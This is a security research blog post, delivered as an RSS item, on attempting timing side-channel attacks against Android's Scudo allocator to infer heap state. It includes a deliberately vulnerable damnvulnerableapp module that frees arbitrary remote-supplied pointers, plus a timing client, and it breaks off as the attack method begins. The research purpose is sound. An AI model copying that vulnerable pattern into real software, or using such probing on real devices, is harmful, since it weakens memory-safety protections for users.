<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on lolcads tech blog</title><link>https://lolcads.github.io/posts/</link><description>Recent content in Posts on lolcads tech blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&amp;copy; lolcads</copyright><lastBuildDate>Tue, 22 Feb 2022 14:10:50 +0100</lastBuildDate><atom:link href="https://lolcads.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Timing Attack Experiments against Scudo (Part 2)</title><link>https://lolcads.github.io/posts/2024/07/scudo_1/</link><pubDate>Fri, 26 Jul 2024 16:46:21 +0100</pubDate><guid>https://lolcads.github.io/posts/2024/07/scudo_1/</guid><description>Attempting Timing Attacks against Scudo In this second blog post we will take a different approach for attacking Scudo, i.e. we will try to the measure execution times for calls to malloc and hope to be able to derive a portion of the internal state of the allocator (i.e. perform side channel attacks). The version of Scudo considered in this blog post is 161cca266a9d0b6deb5f1fd2de8ad543649a7fa1.
There will be almost only negative results (which means I unfortunately could not make it work), except for one.</description><content>&lt;h1 id="attempting-timing-attacks-against-scudo">Attempting Timing Attacks against &lt;em>Scudo&lt;/em>&lt;/h1>
&lt;p>In this second blog post we will take a different approach for attacking &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/;bpv=0;bpt=0">&lt;em>Scudo&lt;/em>&lt;/a>, i.e. we will try to the measure execution times for calls to &lt;code>malloc&lt;/code> and hope to be able to derive a portion of the internal state of the allocator (i.e. perform side channel attacks). The version of Scudo considered in this blog post is &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/METADATA;l=19;drc=45e1036faa0dcfa30a01982880be1137d441333d">&lt;code>161cca266a9d0b6deb5f1fd2de8ad543649a7fa1&lt;/code>&lt;/a>.&lt;/p>
&lt;p>There will be almost only negative results (which means I unfortunately could not make it work), except for one. The main conclusion we can draw from this post is that &lt;em>Scudo&lt;/em> is &lt;strong>not&lt;/strong> designed to mitigate timing attacks! This follows from trying to leak a piece of information and then accidentally leaking a different and unclassified piece.&lt;/p>
&lt;p>&lt;strong>Disclaimer&lt;/strong>: The following analyses can be incomplete and/or incorrect. Also the experiments conducted are on a &lt;strong>very&lt;/strong> basic level compared to the complex field of &lt;em>Data Science&lt;/em>. The style of this post is informal and chosen based on the idea of practical attacks on Android.&lt;/p>
&lt;h2 id="experimental-setup">Experimental Setup&lt;/h2>
&lt;p>As usual, there is a module for the &lt;em>damnvulnerableapp&lt;/em> of the form:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">JNIEXPORT jbyteArray JNICALL
&lt;span style="color:#a6e22e">Java_com_damnvulnerableapp_vulnerable_modules_HeapSCAModule_handleMessage&lt;/span>(JNIEnv &lt;span style="color:#f92672">*&lt;/span>env,
jclass class,
jbyteArray message) {
&lt;span style="color:#66d9ef">uint32_t&lt;/span> length &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetArrayLength(env, message);
&lt;span style="color:#66d9ef">if&lt;/span> (length &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;span style="color:#66d9ef">return&lt;/span> NULL;
jbyte &lt;span style="color:#f92672">*&lt;/span>raw &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>GetByteArrayElements(env, message, NULL);
&lt;span style="color:#66d9ef">if&lt;/span> (raw) {
jbyteArray result &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>NewByteArray(env, &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;span style="color:#66d9ef">switch&lt;/span> (raw[&lt;span style="color:#ae81ff">0&lt;/span>]) {
&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">:&lt;/span> {
&lt;span style="color:#75715e">// Malloc
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">uint64_t&lt;/span> size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>((&lt;span style="color:#66d9ef">uint64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>raw[&lt;span style="color:#ae81ff">1&lt;/span>]);
&lt;span style="color:#66d9ef">uint8_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr;
ptr &lt;span style="color:#f92672">=&lt;/span> malloc(size);
(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion(env, result, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, (jbyte&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>ptr);
&lt;span style="color:#66d9ef">break&lt;/span>;
}
&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">:&lt;/span> {
&lt;span style="color:#75715e">// Free
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">uint8_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>ptr &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">uint8_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">uint64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>raw[&lt;span style="color:#ae81ff">1&lt;/span>]);
free(ptr);
(&lt;span style="color:#f92672">*&lt;/span>env)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>SetByteArrayRegion(env, result, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, (jbyte&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>ptr);
&lt;span style="color:#66d9ef">break&lt;/span>;
}
}
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
&lt;span style="color:#66d9ef">return&lt;/span> NULL;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>This module lets the user directly control whether and how to call &lt;code>malloc&lt;/code> and &lt;code>free&lt;/code>, or, to be more precise, &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=292;bpv=0;bpt=0">&lt;code>Allocator::allocate&lt;/code>&lt;/a> and &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=507;bpv=0;bpt=0">&lt;code>Allocator::deallocate&lt;/code>&lt;/a>. The input is composed like this: &lt;code>&amp;lt;func id&amp;gt;&amp;lt;size | ptr&amp;gt;&lt;/code> (9 bytes).&lt;/p>
&lt;p>&lt;em>damnvulnerableapp&lt;/em> is run in an &lt;em>x86-64&lt;/em> emulator (Pixel 3) running Android 12 and forwards &lt;em>remote&lt;/em> user requests to the above module. It is already expected to see a lot of timing noise based on this setup.&lt;/p>
&lt;p>Notice that measuring execution time of a remote call to e.g. &lt;code>malloc(0x10)&lt;/code> (primary allocation) will actually measure execution time of a call to &lt;code>Java_com_damnvulnerableapp_vulnerable_modules_HeapSCAModule_handleMessage&lt;/code>, which is called from Java.&lt;/p>
&lt;p>As regards the client used to communicate with the app, it is written in &lt;em>C&lt;/em>, thus it is expected to run faster than the former &lt;em>Python&lt;/em> client. Because &lt;em>damnvulnerableapp&lt;/em> uses a request - response model, i.e. a client has to request e.g. &lt;code>malloc(0x10)&lt;/code>, gets a response that the request &amp;ldquo;worked&amp;rdquo; and then has to fetch the result with a second request, the time measurements are conducted as follows:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">struct&lt;/span> timespec before;
&lt;span style="color:#66d9ef">struct&lt;/span> timespec after;
...
&lt;span style="color:#75715e">// Request malloc(0x10)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>app_forward(fd, (&lt;span style="color:#66d9ef">uint8_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)message, &lt;span style="color:#ae81ff">9&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer_length, &lt;span style="color:#f92672">&amp;amp;&lt;/span>before);
&lt;span style="color:#75715e">// Free response buffer
&lt;/span>&lt;span style="color:#75715e">&lt;/span>free(buffer);
&lt;span style="color:#75715e">// Request result of malloc(0x10)
&lt;/span>&lt;span style="color:#75715e">&lt;/span>app_fetch(fd, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer, &lt;span style="color:#f92672">&amp;amp;&lt;/span>buffer_length, &lt;span style="color:#f92672">&amp;amp;&lt;/span>after);
&lt;span style="color:#75715e">// Extract result from response
&lt;/span>&lt;span style="color:#75715e">&lt;/span>pointer &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">uint64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)get_content(buffer, buffer_length);
&lt;span style="color:#75715e">// Free response buffer
&lt;/span>&lt;span style="color:#75715e">&lt;/span>free(buffer);
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>app_fetch&lt;/code> and &lt;code>app_forward&lt;/code> (internally call &lt;code>app_send_formatted&lt;/code>) are the core of this client:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">enum&lt;/span> error_code &lt;span style="color:#a6e22e">app_fetch&lt;/span>(...)
{
...
result &lt;span style="color:#f92672">=&lt;/span> app_send_formatted(fd, &lt;span style="color:#e6db74">&amp;#34;CONTENT&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;FETCH&amp;#34;&lt;/span>, (&lt;span style="color:#66d9ef">uint8_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, NULL);
&lt;span style="color:#66d9ef">if&lt;/span> (result &lt;span style="color:#f92672">!=&lt;/span> error_success) {
log_error(&lt;span style="color:#e6db74">&amp;#34;Failed to forward buffer&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
result &lt;span style="color:#f92672">=&lt;/span> app_full_read(fd, buffer, buffer_size);
&lt;span style="color:#66d9ef">if&lt;/span> (result &lt;span style="color:#f92672">!=&lt;/span> error_success) {
log_error(&lt;span style="color:#e6db74">&amp;#34;Failed to read response to forward&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
&lt;span style="color:#75715e">// Measure time after fetching result
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (after_receive &lt;span style="color:#f92672">!=&lt;/span> NULL)
clock_gettime(CLOCK_THREAD_CPUTIME_ID, after_receive);
...
}
&lt;span style="color:#66d9ef">enum&lt;/span> error_code &lt;span style="color:#a6e22e">app_send_formatted&lt;/span>(...)
{
...
&lt;span style="color:#75715e">// Measure time before forwarding message
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (before_send &lt;span style="color:#f92672">!=&lt;/span> NULL)
clock_gettime(CLOCK_THREAD_CPUTIME_ID, before_send);
result &lt;span style="color:#f92672">=&lt;/span> app_full_write(fd, buffer, buffer_size &lt;span style="color:#f92672">+&lt;/span> content_length);
free(buffer);
&lt;span style="color:#66d9ef">if&lt;/span> (result &lt;span style="color:#f92672">!=&lt;/span> error_success) {
log_error(&lt;span style="color:#e6db74">&amp;#34;Failed to send request&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> result;
}
...
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Because of the request - response model, there is additional noise introduced by being forced to make two remote requests for one e.g. &lt;code>malloc(0x10)&lt;/code>!&lt;/p>
&lt;p>Lets again summarize expected sources of noise introduced by the experimental setup:&lt;/p>
&lt;ol>
&lt;li>Android OS is emulated and therefore does not behave like an Android OS running on a &amp;ldquo;real&amp;rdquo; device (e.g. in terms of CPU power and scheduling)&lt;/li>
&lt;li>Remote access to &lt;em>damnvulnerableapp&lt;/em>. Although the emulator that runs the app is launched within the same device we will perform the measurements with, this is an additional layer of indirection.&lt;/li>
&lt;li>Call to e.g. &lt;code>malloc&lt;/code> is actually a call to &lt;code>handleMessage&lt;/code>, which has to be invoked from Java. The call stack is pretty deep&amp;hellip;&lt;/li>
&lt;li>Two requests per operation&lt;/li>
&lt;/ol>
&lt;h2 id="timing-attacks">Timing Attacks&lt;/h2>
&lt;p>In this section, timing attacks on different targets within &lt;em>Scudo&lt;/em> will be discussed.&lt;/p>
&lt;h3 id="attacking-chunks-array">Attacking Chunks Array&lt;/h3>
&lt;p>The core idea is to abuse a timing side channel on &lt;code>Allocator::allocate&lt;/code>, i.e. calling &lt;code>malloc&lt;/code> in &lt;em>damnvulnerableapp&lt;/em>. &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=69;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1">&lt;code>C-&amp;gt;Count&lt;/code>&lt;/a> will be the target of the attack, i.e. based on the measured execution times, we try to estimate the value of &lt;code>C-&amp;gt;Count&lt;/code>.&lt;/p>
&lt;p>One may ask, why &lt;code>C-&amp;gt;Count&lt;/code> is interesting. There are two reasons:&lt;/p>
&lt;ol>
&lt;li>The chunk arrays are shuffled to, among other things, prevent an attacker from predicting where the next allocated chunk will be located. E.g. this can prevent heap overflows. Knowing &lt;code>C-&amp;gt;Count&lt;/code> looks like the first natural step to predicting how the array looks like in terms of address ordering.&lt;/li>
&lt;li>&lt;code>SizeClassAllocatorLocalCache::allocate&lt;/code> contains a classical pattern for a timing side channel:
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">allocate&lt;/span>(uptr ClassId) {
...
PerClass &lt;span style="color:#f92672">*&lt;/span>C &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PerClassArray[ClassId];
&lt;span style="color:#66d9ef">if&lt;/span> (C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) { &lt;span style="color:#75715e">// If C-&amp;gt;Count = 0, then execution time is longer than &amp;#34;usual&amp;#34;
&lt;/span>&lt;span style="color:#75715e">&lt;/span> ...
refill(C, ClassId);
...
}
&lt;span style="color:#75715e">// The rest is very fast
&lt;/span>&lt;span style="color:#75715e">&lt;/span> ...
CompactPtrT CompactP &lt;span style="color:#f92672">=&lt;/span> C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Chunks[&lt;span style="color:#f92672">--&lt;/span>C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count];
...
&lt;span style="color:#66d9ef">return&lt;/span> Allocator&lt;span style="color:#f92672">-&amp;gt;&lt;/span>decompactPtr(ClassId, CompactP);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;p>When allocating memory from the primary allocator via e.g. &lt;code>malloc(0x10)&lt;/code>, then there is a number of allocations that will result in triggering &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=69;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>C-&amp;gt;Count == 0&lt;/code>&lt;/a>, which again triggers execution of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=169;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>refill&lt;/code>&lt;/a>. Afterwards, assuming that batches are only pushed back through &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=182;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>drain&lt;/code>&lt;/a> or are newly allocated via &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=361;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>map&lt;/code>&lt;/a>, we can distinguish the following cases for &lt;code>C-&amp;gt;Count&lt;/code>:&lt;/p>
&lt;ol>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=183;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>C-&amp;gt;Count = C-&amp;gt;MaxCount / 2&lt;/code>&lt;/a>. This stems from the fact that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=84;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>deallocate&lt;/code>&lt;/a> can create batches if the corresponding &lt;code>Chunks&lt;/code> array is full. To be precise, this will trigger the execution of &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=182;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>drain&lt;/code>&lt;/a>, where &lt;code>C-&amp;gt;Count = C-&amp;gt;MaxCount&lt;/code>. Therefore the minimum &lt;code>Count = Min(C-&amp;gt;MaxCount / 2, C-&amp;gt;Count)&lt;/code> in &lt;code>drain&lt;/code> will evaluate to &lt;code>0 &amp;lt; C-&amp;gt;MaxCount / 2 &amp;lt; C-&amp;gt;MaxCount&lt;/code>. Finally, &lt;code>C-&amp;gt;Count -= Count &amp;lt;=&amp;gt; C-&amp;gt;Count = C-&amp;gt;MaxCount - C-&amp;gt;MaxCount / 2 = C-&amp;gt;MaxCount / 2&lt;/code>. Notice that &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/local_cache.h;l=153;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1">&lt;code>C-&amp;gt;MaxCount = 2 * TransferBatch::getMaxCached(Size)&lt;/code>&lt;/a>. As can be seen in the next step, for &lt;code>malloc(0x10)&lt;/code>, this will result in &lt;code>C-&amp;gt;MaxCount = 2 * 13 = 26 =&amp;gt; C-&amp;gt;Count = 26 / 2 = 13&lt;/code>.&lt;/li>
&lt;li>&lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=396;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>C-&amp;gt;Count = MaxCount&lt;/code>&lt;/a>, i.e.:&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count &lt;span style="color:#f92672">=&lt;/span> MaxCount
&lt;span style="color:#f92672">=&lt;/span> TransferBatch&lt;span style="color:#f92672">::&lt;/span>getMaxCached(Size)
&lt;span style="color:#f92672">=&lt;/span> Min(MaxNumCached, SizeClassMap&lt;span style="color:#f92672">::&lt;/span>getMaxCachedHint(Size))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(Config&lt;span style="color:#f92672">::&lt;/span>MaxNumCachedHint, N)))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, (&lt;span style="color:#ae81ff">1U&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> Config&lt;span style="color:#f92672">::&lt;/span>MaxBytesCachedLog) &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#66d9ef">static_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>u32&lt;span style="color:#f92672">&amp;gt;&lt;/span>(Size))))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, (&lt;span style="color:#ae81ff">1U&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>) &lt;span style="color:#f92672">/&lt;/span> Classes[ClassId &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>])))
&lt;/code>&lt;/pre>&lt;/div>&lt;p>where &lt;a href="https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/size_class_map.h;l=269;drc=b45a2ea782074944f79fc388df20b06e01f265f7">&lt;code>Classes&lt;/code>&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">constexpr&lt;/span> u32 Classes[] &lt;span style="color:#f92672">=&lt;/span> {
&lt;span style="color:#ae81ff">0x00020&lt;/span>, &lt;span style="color:#ae81ff">0x00030&lt;/span>, &lt;span style="color:#ae81ff">0x00040&lt;/span>, &lt;span style="color:#ae81ff">0x00050&lt;/span>, &lt;span style="color:#ae81ff">0x00060&lt;/span>, &lt;span style="color:#ae81ff">0x00070&lt;/span>, &lt;span style="color:#ae81ff">0x00080&lt;/span>, &lt;span style="color:#ae81ff">0x00090&lt;/span>,
&lt;span style="color:#ae81ff">0x000a0&lt;/span>, &lt;span style="color:#ae81ff">0x000b0&lt;/span>, &lt;span style="color:#ae81ff">0x000c0&lt;/span>, &lt;span style="color:#ae81ff">0x000e0&lt;/span>, &lt;span style="color:#ae81ff">0x000f0&lt;/span>, &lt;span style="color:#ae81ff">0x00110&lt;/span>, &lt;span style="color:#ae81ff">0x00120&lt;/span>, &lt;span style="color:#ae81ff">0x00130&lt;/span>,
&lt;span style="color:#ae81ff">0x00150&lt;/span>, &lt;span style="color:#ae81ff">0x00160&lt;/span>, &lt;span style="color:#ae81ff">0x00170&lt;/span>, &lt;span style="color:#ae81ff">0x00190&lt;/span>, &lt;span style="color:#ae81ff">0x001d0&lt;/span>, &lt;span style="color:#ae81ff">0x00210&lt;/span>, &lt;span style="color:#ae81ff">0x00240&lt;/span>, &lt;span style="color:#ae81ff">0x002a0&lt;/span>,
&lt;span style="color:#ae81ff">0x00330&lt;/span>, &lt;span style="color:#ae81ff">0x00370&lt;/span>, &lt;span style="color:#ae81ff">0x003a0&lt;/span>, &lt;span style="color:#ae81ff">0x00400&lt;/span>, &lt;span style="color:#ae81ff">0x00430&lt;/span>, &lt;span style="color:#ae81ff">0x004a0&lt;/span>, &lt;span style="color:#ae81ff">0x00530&lt;/span>, &lt;span style="color:#ae81ff">0x00610&lt;/span>,
&lt;span style="color:#ae81ff">0x00730&lt;/span>, &lt;span style="color:#ae81ff">0x00840&lt;/span>, &lt;span style="color:#ae81ff">0x00910&lt;/span>, &lt;span style="color:#ae81ff">0x009c0&lt;/span>, &lt;span style="color:#ae81ff">0x00a60&lt;/span>, &lt;span style="color:#ae81ff">0x00b10&lt;/span>, &lt;span style="color:#ae81ff">0x00ca0&lt;/span>, &lt;span style="color:#ae81ff">0x00e00&lt;/span>,
&lt;span style="color:#ae81ff">0x00fb0&lt;/span>, &lt;span style="color:#ae81ff">0x01030&lt;/span>, &lt;span style="color:#ae81ff">0x01130&lt;/span>, &lt;span style="color:#ae81ff">0x011f0&lt;/span>, &lt;span style="color:#ae81ff">0x01490&lt;/span>, &lt;span style="color:#ae81ff">0x01650&lt;/span>, &lt;span style="color:#ae81ff">0x01930&lt;/span>, &lt;span style="color:#ae81ff">0x02010&lt;/span>,
&lt;span style="color:#ae81ff">0x02190&lt;/span>, &lt;span style="color:#ae81ff">0x02490&lt;/span>, &lt;span style="color:#ae81ff">0x02850&lt;/span>, &lt;span style="color:#ae81ff">0x02d50&lt;/span>, &lt;span style="color:#ae81ff">0x03010&lt;/span>, &lt;span style="color:#ae81ff">0x03210&lt;/span>, &lt;span style="color:#ae81ff">0x03c90&lt;/span>, &lt;span style="color:#ae81ff">0x04090&lt;/span>,
&lt;span style="color:#ae81ff">0x04510&lt;/span>, &lt;span style="color:#ae81ff">0x04810&lt;/span>, &lt;span style="color:#ae81ff">0x05c10&lt;/span>, &lt;span style="color:#ae81ff">0x06f10&lt;/span>, &lt;span style="color:#ae81ff">0x07310&lt;/span>, &lt;span style="color:#ae81ff">0x08010&lt;/span>, &lt;span style="color:#ae81ff">0x0c010&lt;/span>, &lt;span style="color:#ae81ff">0x10010&lt;/span>,
};
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So for a small allocation, i.e. for &lt;code>ClassId = 1&lt;/code>, we get:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>Count &lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, &lt;span style="color:#ae81ff">0x2000&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>)))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, Min(&lt;span style="color:#ae81ff">13&lt;/span>, &lt;span style="color:#ae81ff">256&lt;/span>)))
&lt;span style="color:#f92672">=&lt;/span> Min(&lt;span style="color:#ae81ff">13&lt;/span>, Max(&lt;span style="color:#ae81ff">1U&lt;/span>, &lt;span style="color:#ae81ff">13&lt;/span>))
&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice that &lt;code>C-&amp;gt;Count = MaxCount&lt;/code> is true for all batches added to &lt;code>FreeList&lt;/code> except for the last one, because &lt;code>N&lt;/code> depends on a minimum:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C++" data-lang="C++">&lt;span style="color:#66d9ef">for&lt;/span> (u32 I &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; I &lt;span style="color:#f92672">&amp;lt;&lt;/span> NumberOfBlocks;) {
TransferBatch &lt;span style="color:#f92672">*&lt;/span>B &lt;span style="color:#f92672">=&lt;/span>
C&lt;span style="color:#f92672">-&amp;gt;&lt;/span>createBatch(ClassId, &lt;span style="color:#66d9ef">reinterpret_cast&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#f92672">*&amp;gt;&lt;/span>(decompactPtrInternal(
CompactPtrBase, ShuffleArray[I])));
&lt;span style="color:#66d9ef">if&lt;/span> (UNLIKELY(&lt;span style="color:#f92672">!&lt;/span>B))
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">nullptr&lt;/span>;
&lt;span style="color:#66d9ef">const&lt;/span> u32 N &lt;span style="color:#f92672">=&lt;/span> Min(MaxCount, NumberOfBlocks &lt;span style="color:#f92672">-&lt;/span> I); &lt;span style="color:#75715e">// If (NumberOfBlocks - I &amp;lt; MaxCount) =&amp;gt; last iteration
&lt;/span>&lt;span style="color:#75715e">&lt;/span> B&lt;span style="color:#f92672">-&amp;gt;&lt;/span>setFromArray(&lt;span style="color:#f92672">&amp;amp;&lt;/span>ShuffleArray[I], N);
Region&lt;span style="color:#f92672">-&amp;gt;&lt;/span>FreeList.push_back(B);
I &lt;span style="color:#f92672">+=&lt;/span> N;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="single---threaded-timing---based-side-channel-attack-on-primary">Single - Threaded Timing - Based Side Channel Attack on Primary&lt;/h4>
&lt;p>Assuming that the only thread that accesses the &lt;em>Scudo&lt;/em> primary for allocations of the form &lt;code>malloc(0x10)&lt;/code> can be convinced to run this allocation with a constant, computable overhead. Then, the following attack might enable the prediction of &lt;code>C-&amp;gt;Count&lt;/code> based on measures of elapsed time:&lt;/p>
&lt;ol>
